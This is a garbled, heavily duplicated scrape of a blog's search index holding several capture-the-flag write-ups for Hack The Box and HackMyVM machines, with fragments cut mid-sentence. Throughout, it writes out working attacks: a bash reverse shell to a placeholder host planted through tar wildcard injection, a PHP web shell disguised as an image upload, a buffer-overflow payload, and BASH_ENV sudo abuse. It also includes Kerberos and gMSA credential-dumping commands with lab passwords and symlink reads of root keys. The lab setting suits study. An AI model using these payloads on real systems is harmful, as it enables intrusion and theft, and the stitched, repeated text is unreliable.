0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

To do this, I will use the POST method.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and 